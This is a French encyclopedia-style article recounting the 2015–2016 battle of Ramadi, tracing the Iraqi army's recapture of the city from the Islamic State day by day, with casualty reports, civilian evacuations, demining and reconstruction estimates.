La bataille de Ramadi, parfois appelée reconquête de Ramadi, a lieu lors de la seconde guerre civile irakienne de décembre 2015 à février 2016. Elle suit la précédente bataille de Ramadi, qui s'était soldée le par la prise de la totalité de la ville par les djihadistes de l'État islamique. Elle commence le 7 décembre 2015 avec l'assaut des Forces armées irakiennes sur le quartier de Ta'Min, au sud de la ville. La cité est déclarée libérée une première fois par le gouvernement irakien le 28 décembre 2015. Mais l'EI contre-attaque au début du mois de janvier 2016, reprenant environ 20 % de la ville et plusieurs zones aux alentours. Le gouvernement irakien parvient à liquider ces nouvelles poches de résistance, à reprendre les alentours de la ville, et à sécuriser la route entre Ramadi et Bagdad le 9 février 2016, mettant ainsi fin à la bataille.
Prélude.
La perte de Ramadi par les forces armées irakiennes, en mai 2015, est une victoire stratégique et symbolique très importante pour l'État islamique, et un violent revers pour le gouvernement de Bagdad. En effet, stratégiquement, Ramadi est situé à une centaine de kilomètres à l'ouest de Bagdad, et symboliquement, c'est le chef-lieu de la province d'Al-Anbar. Sa reconquête par le gouvernement devient donc vite un objectif important.
Le 23 mai 2015, six jours après la prise de la ville par les djihadistes, l'armée irakienne et des milices tribales menées par le cheikh Rafeh Abdelkarim al-Fahdawi, lancent des assauts sur des localités aux alentours de Ramadi et notamment sur Husaybah, un village situé à à l'ouest de Ramadi. Le 26, l'armée lance une opération visant à isoler les forces de l'EI et à préparer l'offensive pour reprendre Ramadi. Elle est baptisée « À tes ordres Hussein », du nom d'un imam chiite. Face aux critiques, elle est ensuite rebaptisée « À tes ordres ô Irak ».
Le 24 août, quatre kamikazes de l'État islamique attaquent un quartier-général de l'armée irakienne à al-Jaraishi, au nord de Ramadi, faisant cinq morts dont deux généraux : Abdel Rahman Abou Raghif, commandant adjoint des opérations dans la province d'al-Anbar, et Safine Abdel Madjid, commandant de la .
Début octobre, les forces irakiennes soutenues par l'aviation américaine parviennent à progresser à l'ouest de Ramadi et à reprendre plusieurs localités, dont les villages de Zankura, Albu Jleib, al-Adnaniya, une partie d'Albu Richa et la zone appelée kilomètre 5 lors d'une opération mobilisant . Mais fin octobre et début novembre les pluies torrentielles freinent la progression des forces gouvernementales.
Le 25 novembre 2015, les forces irakiennes, aidées par des bombardements américains, reprennent le pont Palestine qui enjambe l'Euphrate au nord-ouest de la ville, afin de procéder à son encerclement et de couper son approvisionnement en eau.
Les 4 et 5 décembre, l'EI lance plusieurs voitures piégées sur les positions des forces gouvernementales. Au moins 6 sont détruites, et 8 autres sont interceptées.
Dans les premiers de jours de décembre, afin de préparer le terrain pour l'attaque, la coalition mène 45 frappes aériennes dans la région de Ramadi. Un bilan dressé par l'état-major américain le 10 décembre estime que 350 djihadistes sont morts dans les frappes, dont leurs chefs Abu Salah et Abu Maryam. Ces 350 morts ne sont pas inclus dans les estimations des forces en présence à Ramadi au moment de l'assaut du 7 décembre. Toutefois, les bombardements tuent et blessent de nombreux civils. D'autant plus que l'état-major américain estime que seuls quelques petits groupes de civils sont parvenus à fuir la cité, et qu'entre sont restées bloquées à l'intérieur. 
Forces en présence.
Depuis la prise du pont Palestine le 25 novembre 2015, la ville est entièrement encerclée, et son approvisionnement en eau est coupé. Trois brigades irakiennes entraînées par les Américains sont envoyées en renfort, au total des forces irakiennes sont engagés dans l'offensive. Le colonel Steven Warren, porte-parole de l'Opération "Inherent Resolve", estime que les troupes irakiennes sont désormais assez nombreuses pour lancer une attaque sur la ville et que les djihadistes auront du mal à fuir. Par ailleurs, des membres des forces spéciales australiennes sont engagées aux côtés de l'armée irakienne, notamment pour guider les frappes aériennes
Les forces de l'État islamique sont estimées entre 600 et selon le colonel Steven Warren. Les djihadistes ont fortifié leurs positions de manière avancée depuis plusieurs mois. Ils ont notamment déposé des explosifs et des mines en cercles concentriques autour de Ramadi. Et, à l'exception des trois brigades formées par les États-Unis et des membres du "Iraqi Counter Terrorism Service", une formation antiterroriste comptant au total, entrainé par un détachement de la 13e demi-brigade de Légion étrangère, les troupes gouvernementales irakiennes ne sont pas bien formées au combat urbain. De plus, du fait de divergence entre les États-Unis et les milices chiites des Hachd al-Chaabi, ces dernières, soutenues par l'Iran, ne participent pas aux combats.
Déroulement.
7 et 8 décembre 2015 : Assaut initial et reprise de Ta'Min par le gouvernement irakien.
Le 7 décembre 2015, l'armée irakienne lance l'assaut sur le quartier universitaire de Tamin, au sud-ouest de la ville. Dans le même temps, des combats ont lieu au village d'Husaybah, à à l'est de Ramadi.
Le 8 décembre, Sabah al-Nomane, porte-parole des services de lutte antiterroriste irakiens, déclare à l'AFP que : . Ses propos sont par la suite confirmés par le général Hadi al-Irzayij, chef de la police de la province d'Al-Anbar et porte-parole du commandement des opérations conjointes. Ce-dernier estime que . D'autant plus que la prise de Ta'Min a permis de mettre la main sur de nombreuses quantités de munitions.
Malgré une prise rapide du quartier de Tamin, les forces gouvernementales irakiennes sont stoppées dans leur élan durant l'après-midi du 8 décembre. En effet, deux obstacles s'imposent. De très nombreux pièges explosifs ont été laissés par les djihadistes de Daech avant de quitter le quartier, et il est impératif de les déminer avant de poursuivre la progression. Un total de 62 engins explosifs improvisés ont été trouvés en 3 jours, faisant 4 blessés. Et, pour rejoindre le centre-ville, il faudra par la suite traverser la rivière Warar — un bras de l'Euphrate — dont l'autre rive est toujours tenue par l'EI. Selon une source sécuritaire de l'agence Xinhua, les pertes des combats du 8 décembre sont d'au moins 27 djihadistes tués — dont 15 par des frappes aériennes — et 5 morts et 3 blessés du côté des forces gouvernementales.
Du 9 décembre au 21 décembre 2015 : reprise des quartiers périphériques par le gouvernement irakien.
Le 9 décembre, tandis que le déminage de Tamin se poursuit, Ashton Carter, le ministre de la Défense américain, déclare que les États-Unis "« sont prêts à aider l’armée irakienne avec des moyens additionnels »" pour l’aider à "« finir le travail »" à Ramadi, "« y compris des hélicoptères d’attaque et des conseillers militaires »".
Afin d'en consolider le contrôle, la police d'Habbanyah, une localité plus à l'ouest, déploie une partie de ses hommes dans le quartier de Tamin.
De plus, une offensive de l'armée dans l'ouest de la ville parvient à chasser les djihadistes de leur poste de commandement militaire. La prise du poste de commandement et celle du quartier de Ta'mim permettent de profiter d'un avantage géographique, car ces deux positions surplombent la ville.
En réaction à l'avancée des troupes irakiennes à l'intérieur de la ville, l’État islamique impose aux civils des zones qu'il contrôle encore l'interdiction de sortir de la ville, et l'obligation de rester le plus possible dans leurs maisons. Le but de la manœuvre étant de pouvoir se servir d'eux comme boucliers humains. Les djihadistes se servent de l'exemple d'une famille qu'ils ont tué alors qu'elle tentait de fuir la ville, au début du mois de décembre.
Le 10 décembre, le major-général Ismail Malhawi déclare qu'une série de bombardement de la coalition internationale au nord de Ramadi aurait causé la mort de "65 éléments de l'EI en plus de sérieux dégâts matériels", sans donner plus de précisions. Une autre source sécuritaire, qui déclare vouloir garder l'anonymat, confirme les frappes mais donne un bilan plus modéré : l'armée de l'air irakienne aurait tué 10 membres de Daech et détruit 4 véhicules piégés. Ces véhicules piégés étaient censés exploser sur les lignes irakiennes, mais ils auraient été interceptés et détruit bien avant de les atteindre.
Le soir du 10 décembre (heure irakienne, nuit du 10 au 11 décembre heure française), le lieutenant-général Abdul-Ghani al-Asadi, commandant des forces anti-terroristes, déclare que ses troupes ont pris le contrôle d'un périmètre dans l'ouest de Ramadi, s'étendant du pont Palestine jusqu'au pont Al-Qasim. Il annonce également attendre de nouvelles instructions du commandement général avant de poursuivre l'offensive. Il ne donne aucune précision sur la nature des combats, ou le nombre de morts ou de blessés parmi les militaires, les djihadistes ou les civils.
De plus, le général Yahia Rasoul confirme à Reuters que, simultanément à l'assaut des forces anti-terroristes à l'ouest de Ramadi, l'armée a attaqué le nord de la ville, et est parvenue à créer plusieurs percées. Durant les assauts, l'explosion de 2 kamikazes provoque au moins 27 morts parmi les militaires.
Pour tenter de ralentir la progression des militaires irakiens, l’État islamique détruit tous les ponts qui mènent directement au centre de la ville. Cette manœuvre est à double-tranchant : elle renforce les fortifications du centre, mais elle divise les djihadistes en trois groupes isolés les uns des autres.
À la fin de la journée du 10 décembre, l’État islamique a perdu le sud et le sud-ouest de la ville, ne contrôle plus que partiellement le nord et l'ouest de Ramadi, et continue de tenir le sud-est, l'est et le centre de la ville. Des messages radios interceptés indiquent que les djihadistes manquent de vivres et de munitions. Les services de renseignements irakiens estiment qu'il ne reste plus qu'entre 250 à 300 combattants de Daech, et qu'entre sont encore coincées dans la ville. Les djihadistes toujours au centre de la ville s'abritent dans un réseau de fortifications, constituées d'un réseau élaboré de tunnels, de bâtiments piégés, et de routes en lacets minées.
Le 11 décembre, les forces armées irakiennes reçoivent le renfort de 500 miliciens tribaux du clan Al-Hashed, dirigés par le général Yusuf al-Asal - lui-même étant un dirigeant du clan. 
En inspectant des entrepôts d'armes dans les zones reprises, les forces gouvernementales irakiennes découvrent des roquettes de fabrication militaire, mais également d'autres roquettes artisanales, fabriquées à partir de bouteilles de gaz. En inspectant d'autres bâtiments pris à Daech, les militaires découvrent également une liste de fonctionnaires qui ont rejoint l'organisation pour sauver leurs vies, et une liste d'autres fonctionnaires qui ont été probablement exécutés par les djihadistes. 
Un groupe de civils parvient à profiter de l'avancée de l'armée pour fuir les zones de contrôle de l’État islamique ; pour cela, ils se sont dirigés vers les militaires en agitant un drapeau blanc. D'autres civils parviennent également à quitter ces zones de contrôle, en versant des pots-de-vin. 
Le 12 décembre, les forces gouvernementales irakiennes passent l'Euphrate, et tentent de progresser vers la zone d'habitation appelée Al-Thubaat.
De plus, l'armée irakienne reprend le lieu-dit Al-Aramil, à au sud de Ramadi, avec l'aide des miliciens tribaux et de bombardements de la coalition internationale. 22 membres de l'EI sont tués lors des combats, le bilan des pertes pour les militaires n'a pas été encore communiqué. La progression des troupes irakiennes est stoppée, le temps de déminer les pièges et les véhicules piégés laissés par les djihadistes. 
Le 13 décembre, de nouveaux combats éclatent aux axes nord et sud de la ville, durant lesquels 11 djihadistes sont tués. 3 véhicules piégés conduits par des kamikazes sont détruits par des frappes aériennes de la coalition. 
Le 14 décembre, une frappe aérienne de la coalition internationale au nord de Ramadi tue 15 membres de l'EI et détruit 5 de ses véhicules. Le même jour, une série d'attentats provoque la mort d'au moins 35 militaires et miliciens sunnites. 
Le 15 décembre, l'EI mène une attaque avec 12 à 15 véhicules kamikazes à l'est de la ville. Selon des sources militaires irakiennes de l'AFP, l'attaque est repoussée et le bilan n'est que de 2 tués et 6 blessés parmi les policiers. En revanche, d'après des sources militaires d'Al Jazeera, le bilan est d'au moins 65 morts parmi les forces irakiennes. 
Le 16 décembre, Daech vise trois des positions des unités paramilitaires arabes sunnites Hashd Shaabi au nord de Ramadi, en les attaquant avec 6 véhicules piégés. Selon les militaires irakiens, tous les véhicules auraient été détruits par des missiles guidés anti-chars, avant d'avoir eu le temps d'atteindre les paramilitaires. 
Des combats éclatent également à l'est de la ville, entre la huitième brigade de l'armée irakienne et l'EI. Dans une zone appelée Tel Mshahydh, l'organisation terroriste fait exploser 4 véhicules piégés. Après des combats acharnés, les djihadistes sont repoussés, grâce à l'aide de l'aviation irakienne et de celle de la coalition internationale. Le Général de brigade Majid al-Fatlawi, commandant de la Huitième Brigade, n'indique pas les pertes subies par l'Armée irakienne ; par contre, il déclare que 37 djihadistes ont été tués lors des affrontements, dont "plusieurs leaders asiatiques", sans préciser leurs identités.
Le 17 décembre, le major Hussein, commandant des unités anti-terroristes, fait visiter le quartier de Ta'Mim a une équipe de journalistes de la chaîne de télévision française TF1. Il leur déclare que le déminage du quartier est presque terminé ; que 170 djihadistes avaient trouvés la mort lors des trois jours de combat pour prendre le quartier ; que l'armée irakienne a retrouvé beaucoup de matériel militaire utilisé par Daech, notamment des tanks, et des roquettes et des obus artisanaux ; qu'ils ont également saisit des documents administratifs de l'organisation État islamique ; que des maisons ont été utilisées pour dissimuler l'entrée des tunnels anti-bombardements de l'EI et qu'au moins une villa avait été reconvertie en une usine d'obus ; et que quelques rares civils revenus à Ta'Mim ont pris les armes pour former un groupe d'auto-défense. Le major Hussein fait également écouter un message radio intercepté, dans lequel un responsable de Daech s'assure qu'aucun civil ne parvienne à quitter l'est de la ville. L'équipe de télévision est aussi brièvement témoin d'un échange de tirs entre les snipers de l'Armée et ceux du groupe terroriste, d'une rive à l'autre de l'Euphrate. Le major Hussein annonce le retrait prochain de ses troupes de Ta'Mim, remplacées par d'autres unités censés assurer l'ordre dans le quartier.
Le 19 décembre, le général-major Ismail al-Mahlawi annonce que le corps du chef djihadiste Abu Musab al-Maqdisi a été retrouvé, très probablement tué lors d'une des opérations de nettoyage de Ramadi.
Le ministre irakien de la Défense, Al-Obeidi, estime que la ville sera reprise avant la fin du mois de décembre 2015.
Le 20 décembre, des frappes de l'armée de l'air irakienne au nord de Ramadi blessent de nombreux membres de l'EI. Le bilan exact est inconnu ou n'a pas été communiqué.
Le ministre irakien de la Défense, Khaled al-Obeidi, fait trois annonces. La première est que des éléments des groupes paramilitaires sunnites al-Hashed al-Sha’bi vont être incorporés à l'armée professionnelle afin de mieux les entraîner et de compenser un manque de troupes au sol. La deuxième est que l'armée a pris le contrôle de nouveaux axes au nord de Ramadi. Et la troisième, relative à la guerre civile en général, est que l'équivalent de trois milliards de dollars de contrats passés par l'Armée vont être remplacés, afin de trouver des associés plus performants.
Une force composée de militaires, et de miliciens de la tribu al-Hashed, dirigée par le major-général Ismail al-Mahalawi et soutenue par l'aviation irakienne et de la coalition internationale, commence une offensive contre une zone du nord de Ramadi appelée Albu Ziyab. Aucune information sur les pertes humaines, quel que soit le camp, n'est communiquée ; par contre l'Armée indique avoir détruit 2 véhicules piégés et un atelier contenant des produits toxiques.
En vue d'une opération militaire d'ampleur pour reprendre le centre de Ramadi, des renforts militaires sont acheminés au nord et à l'est de la ville. Ils apportent de l'artillerie lourde, de l'infanterie et des tanks.
À la fin de la journée du 20 décembre, des avions militaires irakiens larguent des tracts sur Ramadi, dans lesquels ils demandent aux civils de quitter la ville dans les 72 heures et indiquent des routes considérées comme sécurisées.
Du 21 au 28 décembre 2015 : reprise du centre-ville par le gouvernement irakien.
Le 21 décembre, le commandant-en-chef Othman al-Ghanemi annonce que l'opération de reprise du centre-ville commencera dans quelques heures. L'agence Reuters précise que l'armée veut finir de prendre totalement le contrôle d'un autre secteur de la cité avant de lancer son offensive. Cependant, cette opération risque fortement d'être gênée par les civils dont Daech se sert comme boucliers-humains.
Le 22 décembre, le major-général Ismail al-Mahalawi annonce que ses troupes ont repris le contrôle de 50 % d'Albu Ziyab, et que les bombardements de la coalition internationale y ont détruit un abri et un entrepôt de bombes.
Fin décembre, les troupes irakiennes butent sur une forte résistance des forces de l'EI, particulièrement dans le quartier de Hoz près de l'ancien siège gouvernemental. Cet enlisement est dû principalement à la présence de nombreux civils, aux engins explosifs, aux snipers et aux attaques kamikazes.
Le 27 décembre, l'armée irakienne affirme avoir pris le contrôle du siège du gouvernement provincial de Ramadi. Le porte-parole des unités anti-terroristes, Sabah al-Numan, affirme que "Tous les combattants de Daech sont partis. Il n'y a pas de résistance. Nos forces vont pénétrer dans le complexe dans les heures qui viennent".Les forces de l'EI ont forcé des civils vivant près du complexe gouvernemental à les suivre, afin de les utiliser comme bouclier dans leur fuite. Il faut toutefois déminer le bâtiment. Selon des sources médicales, les combats auraient fait 93 blessés parmi les forces irakiennes, et plus de 50 morts chez les djihadistes.
Le 28 décembre, la ville est déclarée totalement libérée par l'état-major irakien, dont le général de brigade Yahya Rasool qui en fait l'annonce à la télévision irakienne. Cette victoire est la première victoire importante pour l'Armée irakienne obtenue sans le soutien des milices chiites. Il reste probablement quelques djihadistes, mais ceux-ci ont cessé d'opposer une résistance à l'Armée. Par contre, il reste le danger des engins explosifs disséminés dans la ville, qu'il faut déminer ; la de l'Armée irakienne estime qu'il y en aurait 300 dans le complexe gouvernemental et sur les routes qui y mènent. 
Du 28 décembre 2015 au 7 janvier 2016 : contre-offensive djihadiste.
Le soir du 28 décembre, les djihadistes contrôlent toujours l'est de la ville. Le 30 décembre, la coalition déclare qu'elle estime que 700 djihadistes sont toujours présents à l'intérieur de Ramadi, dont 400 dans le centre et 300 à l'est.
Le janvier l’État islamique mène une grande contre-offensive, selon le chercheur Romain Caillet, l'État islamique revendique la reprise totale du pont Bou Assaf, un point stratégique au nord-ouest de Ramadi . Toujours selon Romain Caillet, l'EI revendique la prise de 10 casernes de l'armée irakienne au nord de Ramadi et 5 casernes de l'armée irakienne à l'est de Ramadi . Selon le journaliste Wassim Nasr, les djihadistes avancent sur tous les fronts. Les mauvaises conditions météorologiques empêchent la coalition de mener des frappes aériennes précises sur Ramadi . Selon Al Jazeera, 60 soldats de l'armée irakienne ont été tués par les djihadistes de l'EI à Ramadi.
Le 2 janvier, l'EI lance de nombreuses contre-offensives, majoritairement au nord et à l'est de la cité, aussi vers l'ouest, et multiplie les attentats-suicides dans les faubourgs.
Le 3 janvier 2016, le Major-Général Hadi Rseg, chef de la police dans la province d'Al-Anbar, annonce que le gouvernement contrôle 80 % de la ville. Les zones encore contrôlées par les djihadistes seraient la zone d'Al-Mallad - au sud de Ramadi - et la Vingtième Rue.
Le 4 janvier, lors d'un accrochage entre les militaires irakiens et les combattants de l’État Islamique, les unités d'élite anti-terroriste sont déployées et délivrent plusieurs civils utilisés comme bouclier humain.
Le 5 janvier, malgré des bombardements menés par la Coalition Internationale pour le ralentir, un convoi de Daech parvient à l'ouest de Ramadi, au niveau du district d'Haditha, par deux axes différents.
Le 6 janvier, un autre convoi de l’État Islamique est repéré sur le même itinéraire. Cette fois, l'aviation irakienne, l'aviation de la Coalition Internationale, l'artillerie irakienne, et des miliciens tribaux équipés de lance-roquettes, mènent une intense série de frappes coordonnées. Selon l'Armée irakienne, le bilan des frappes est de 250 membres de l'EI tués, et de 100 véhicules détruits, dont plusieurs véhicules piégés.
Afin d'empêcher les forces gouvernementales de l'utiliser, les combattants de Daech détruisent en partie l'Hôpital Général de Ramadi, situé au nord de la ville, avant d'abandonner cette position. À noter un fait extrêmement inhabituel de la part de l'organisation terroriste : ses membres ont pris la peine d'évacuer les civils vivant aux abords de l'hôpital avant d'enclencher les explosions.
Le 7 janvier, les troupes irakiennes, appuyées par des frappes de la Coalition Internationale, avancent dans Ramadi, mais buttent de nouveau face à la résistance de l'EI dans plusieurs quartiers. Les principaux lieux de confrontation sont : le quartier d'Al-Andalus au centre de la ville ; partiellement le district d'Al-Mallad au sud ; la Grande Mosquée au centre ; la mosquée Al-Haq au sud ; le quartier d'Al-Mujarabat au centre. L'agence de presse EFE signale que les combats dans le seul quartier d'Al-Mallad ont provoqué plusieurs dizaines de morts et de blessés graves dans les deux camps. Les affrontements à Al-Mujarabat provoquent la mort de 5 agents irakiens, 19 membres de l'EI, et la destruction de 4 véhicules de l'EI. Ailleurs, les djihadistes parviennent à exploser 4 tanks de l'Armée irakienne, et une maison ayant appartenu à un officier de police.
Du 8 janvier au 4 février 2016 : reconquête des positions perdues.
Dès le 8 janvier : Ramadi même.
Le 8 janvier 2016, une offensive des forces gouvernementales parvient à chasser les djihadistes d'Al-Mallad, tout en tuant 13 d'entre eux. Afin de signaler la reprise du secteur, le drapeau irakien est hissé sur la mosquée Al-Haq.
Après des combats causant plusieurs dizaines de morts, et grâce au soutien des aviations de l'Irak et de la Coalition Internationale, les forces gouvernementales parviennent à progresser dans la zone d'Al-Andalus. Mais une fois de plus, cette avancée est ralentie par les mines déposées par l’État Islamique.
Le Haut Commissariat des Nations unies pour les réfugiés annonce se charger de déplacer un millier de civils de Ramadi, notamment des enfants, vers le camp d'Habbaniyah, afin de les éloigner des combats.
La progression des soldats au centre-ville reste ralentie par toutes les mines disposées sur les routes, un soldat affirmant même à une équipe de télévision d'Euronews que la totalité des routes du centre sont piégées.
En plus du poste-de-commandement situé au sud-est de la ville, l'Armée en installe un autre au centre. L'état-major préfère éviter de se réinstaller dans le complexe gouvernemental - gardé par un seul contingent de militaires - ou dans la station de police du centre-ville, jugés trop proches du front, et décide de l'établir dans une villa un peu plus éloignée des zones de combat.
Le Lieutenant-Général Abdul-Ghani Al-Asani annonce avoir capturé quelques prisonniers, mais très peu, car les djihadistes préfèrent mourir en kamikaze plutôt que de se rendre.
L'explosion d'un engin piégé, sur la ligne de front, tue 2 civils : une mère et son enfant.
Le 9 janvier, la zone d'Al-Andalus et la Grande Mosquée, situées au centre de Ramadi, sont déclarées entièrement nettoyées.
La Huitième Brigade de l'Armée Irakienne parvient à reprendre la totalité des locaux de l'Université Maaref, dans l'est de la ville, et le signale en y hissant le drapeau irakien.
Une frappe aérienne de l'Armée de l'Air Irakienne, menée avec un avion F-16, tue 3 djihadistes dans la zone de Tal Mashida, au nord-est de Ramadi.
Le 10 janvier, les unités d'élite anti-terroriste continuent leur progression dans les banlieues à l'est de Ramadi. De plus, elles assurent leurs arrières en élevant des talus aux abords du centre-ville.
Devant l'ampleur de la tâche de déminage, les efforts sont concentrés sur les artères principales de la ville et sur les bâtiments jugés stratégiquement importants. Pour les autres bâtiments, pour le moment, une simple indication "miné" est peinte sur leurs façades, lorsque des explosifs y sont repérés.
Le Programme des Nations unies pour le développement (Pnud) annonce attendre le feu vert des autorités irakiennes pour reconstruire la ville. Cependant, l'ampleur des destructions dues aux frappes aériennes et aux pièges explosifs est immense - certains cratères de bombardement font la taille d'une piscine et plusieurs rues ont été annihilées. À l'heure actuelle, l'ONU estime que la reconstruction de Ramadi nécessitera 50 millions de dollars (46 millions d'euros), alors que l'estimation du Conseil de la Province d'Anbar monte à 12 milliards de dollars. Lise Grand, numéro-deux du Pnud, estime pour sa part que Ramadi va avoir besoin en urgence de 20 millions de dollars pour répondre aux besoins humanitaires, puis plus tard de plusieurs milliards de dollars pour se reconstruire.
Daech lance un assaut violent sur une position de la Dixième Brigade de l'Armée, dans la zone d'Albu Ainyah, au nord-est de la ville. Les militaires repoussent les djihadistes et tuent 4 d'entre eux. De plus, ils saisissent du matériel utilisés par l'organisation terroriste lors de l'assaut : de l'armement léger et moyen.
Dans la zone d'Al Sufiya, à l'est de Ramadi, une offensive de l'Armée, soutenue par l'aviation de la Coalition Internationale et de l'Irak, provoque la mort de 22 djihadistes.
Le 11 janvier, des policiers et des membres des forces anti-terroristes parviennent à faire évacuer 635 civils hors de l'est de Ramadi. Ils seront envoyés au camp d'Habbaniyah, à Khalediyah, après avoir reçu des soins médicaux. En outre, l'Armée capture 12 membres de l'EI qui avaient tenté de se mêler aux civils.
Dans la zone d'Albu Faraj, au nord de la ville, les équipes de déminages font détoner de manière préventive 64 engins explosifs improvisés. À Malaab, 250 autres engins explosifs sont désamorcés.
3 kamikazes tentent de s'en prendre aux positions de l'Armée dans le village d'Husaiybah, à à l'est de Ramadi. Mais les Forces d'Intervention Rapide irakiennes les interceptent et les abattent par balles avant qu'ils n'atteignent le village.
Les troupes irakiennes ne sont pas ralenties dans leur progression seulement par les mines, mais également par les snipers de l'EI. Un bilan dressé le 11 janvier indique qu'entre le 28 décembre 2015 et le 11 janvier 2016, 55 raids aériens ont été menés par la Coalition Internationale contre les positions des snipers.
À la date du 11 janvier 2016, et depuis qu'il a été chassé de Malaab, l’État Islamique ne contrôlerait plus aucun grand secteur à l'intérieur de Ramadi. Il resterait cependant des petits bastions, couverts par des snipers. Et il aurait installé ses troupes dans une bande de terres cultivées à à l'est de la ville.
La Huitième Brigade, après des combats qui ont provoqué des douzaines de morts, parvient à reprendre possession de l'ancien QG des forces de sécurité de la province d'Anbar. Symboliquement, le drapeau irakien est hissé sur le bâtiment.
L'artillerie de la Seizième Brigade lancent des frappes précises dans la zone d'Asreya, visant des futurs kamikazes ; elle en aurait tué 6 et blessé 2.
À la suite d'informations fournies par les services de renseignement irakiens, un convoi de Daech tentant de fuir le nord de la ville est repéré. Il aurait été constitué de 20 véhicules, dont des automitrailleuses. L'aviation irakienne aurait détruit le convoi, causant la mort de 40 djihadistes, dont plusieurs de leurs chefs (dont les identités n'ont pas été dévoilées par l'état-major).
Le 12 janvier, les forces anti-terroristes parviennent à évacuer hors de l'est de Ramadi 250 civils supplémentaires. Ils seront envoyés au camp d'Habbanyiah.
Le 13 janvier, l'aviation américaine lance une série de 24 frappes en Irak. Ramadi fait partie des trois villes les plus ciblées - avec Mossoul et Kisik.
À à l'ouest de Ramadi, les bourreaux de Daech exécutent par balles 4 autres combattants islamistes qui avaient fui la ville.
L'Armée irakienne, avec le soutien de l'aviation de la Coalition Internationale, lance des assauts sur les bastions de Daech subsistant dans l'est de la ville : les zones d'Al-Sofiya, de Joabiya et d'Al-Took. Les combats provoquent la mort de 16 membres de l'organisation terroriste, et la destruction de 9 véhicules piégés. Les forces anti-terroristes et la police d'Anbar parviennent à faire tomber Al-Sofiya, au nord-est, mais leur avancée est stoppée nette par les dizaines de pièges explosifs qui y sont disposés.
Selon les estimations de l'Armée irakienne, à la date du 13 janvier 2016, il resterait au maximum 200 djihadistes dans l'est de la ville, et 700 familles y seraient encore piégées.
Le 14 janvier, l'Armée parvient à reprendre totalement la zone d'Albu Aitha, au nord-est de la ville, après des combats qui ont fait un nombre indéterminé de morts.
Des unités anti-terroristes et des forces de police parviennent à évacuer 60 familles de civils hors de l'est de Ramadi. Ils seront envoyés au camp d'Habbaniyah.
À cause des pièges explosifs qui y étaient dissimulés, la zone d'Al-Sofiya n'avait pas pu entièrement être reprise par les forces gouvernementales. De ce fait, les combats s'y poursuivent le 14 janvier. Pour les mêmes raisons, l'Armée parvient à reprendre partiellement, mais pas totalement, les zones d'al-Sijariya et d'Albu Ghanem.
Le 15 janvier, l'Armée parvient à prendre le contrôle de la majorité de la zone d'Al-Sofiya, et à prendre partiellement les zones d'Al-Sijariya et d'Albu Ghanem. Là encore, le contrôle n'est pas total car les pièges explosifs gênent la progression ; et de plus, des civils y sont opposés comme boucliers humains. Dans la zone d'Al-Sofiya, plusieurs pièges et véhicules-piégés explosent au cours de la bataille Selon l'Armée, 800 de ces civils sont délivrés ; ils seront envoyées aux camps d'Habbaniyah et de Ameriyat Falujah après avoir reçu de la nourriture et des médicaments. Rien que dans la zone d'Al-Sofiya, l'Armée irakienne et des journalistes de la NPR estiment que 1000 civils servaient de boucliers-humains. Plusieurs parviennent à s'échapper en courant vers les militaires irakiens en agitant un drapeau blanc. Mais les tirs de l'EI pour les retenir, et probablement également des balles perdues de l'Armée, tuent de nombreux civils, et en blessent beaucoup d'autres - dont 4 enfants âgés de 5 ans.
Du fait de la très grande concentration de civils sur la ligne de front, une seule frappe aérienne est lancée, en fin de journée. Cette très grande concentration dans une portion réduite de la cité s'explique par le fait que les djihadistes ont forcé des civils à les suivre dans leur retraite, au fur et à mesure que les poches de résistances étaient délivrées par l'Armée.
La police basée au village d'Husaiybah, à l'est de Ramadi, utilise des lance-roquettes pour détruire deux ou trois des positions défensives de l'EI situées près du village. L’État-major estime que cela a provoqué la mort de 7 djihadistes.
Le Major-Général Majid al-Fatlawi annonce que la Huitième Brigade parvient à libérer totalement la zone d'Al-Sura. Les combats auraient fait 5 morts parmi les djihadistes. Le Maj-Gen. al-Fatlawi évoque également la destruction d'un véhicule-piégé et la mort de son pilote-kamikaze, mais reste trop flou pour savoir si le véhicule-piégé a été détruit par les militaires ou s'il a explosé sur leurs lignes. Plus tard dans la journée du 15 janvier, il annonce également que sa brigade a repris la zone d'Albu Sodah, à l'est de Ramadi, et y a hissé le drapeau irakien. Les combats auraient fait 10 morts parmi les rangs de Daech et auraient détruit un véhicule armée de l'organisation.
Le 16 janvier, la Huitième Brigade poursuit sa progression et reprend les zones d'Albu Khalifa et d'Albu Mahal à l'est de la ville. Les combats auraient provoqués 15 morts parmi les djihadistes, dont 3 futurs kamikazes équipés de ceintures d'explosifs, la destruction de 3 véhicules armés, et celle d'un ancien véhicule militaire piégé.
À partir du 17 janvier 2016 : extension des combats de positions aux alentours de la ville.
Le 17 janvier, les forces gouvernementales, couvertes par l'aviation irakienne, parviennent à progresser dans les zones d'al-Sijariya et d'al-Jubiya, dans l'est de la ville. Ceci déclenche de nombreux affrontements entre les combattants de l'Irak et ceux de l’État Islamique. Finalement, les forces gouvernementales gagnent du terrain, et dressent un bilan selon lequel les combats et les bombardements ont tué 25 djihadistes et détruit quelques-unes de leurs cachettes.
Les Forces d'Intervention Rapide basées au village d'Husaibah lancent un assaut sur les troupes de Daech basées à l'extérieur à l'est de Ramadi. L'opération réussit et permet de tuer 21 djihadistes et de détruire 3 de leurs véhicules et 6 de leurs cachettes et poste-de-commandement. Par contre, 8 pièges explosent au passage des forces rapides, causant un nombre indéterminé de morts et de blessés.
Afin de prendre les troupes de Daech en tenaille dans la zone d'Al-Sofiya, les troupes de la police fédérale irakienne traversent les zones de Juwiba et d'Al-Sedikiya, encore tenues par l'EI. L'objectif final étant de pouvoir faire une jonction avec les militaires se battant à Al-Sofiya. Les combats provoqués par le passage de la police aboutissent, du côté de Daech, à la perte de 40 hommes, de 5 véhicules équipés d'armes lourdes et de 6 positions défensives ; du côté de la police irakienne, un nombre non-communiqué de pertes humaines à cause de l'explosion de 16 pièges. Même stratégie de la part de la police à travers la zone de Joahb. Dans cette zone, le bilan de la police est de 31 djihadistes tués, et 4 véhicules équipés d'armes lourdes et 5 positions défensives de l'EI détruites, contre un nombre non-communiqué de policiers tués par l'explosion d'un piège.
À Al-Sofiya, les combats entre l'Armée et l'EI se poursuivent, ce qui aboutit aux morts de 12 militaires et de 17 djihadistes. De plus, au moins 13 civils, dont 7 femmes et 3 enfants, sont tués par l'explosion d'un piège alors qu'ils tentaient de fuir la zone de contrôle de Daech.
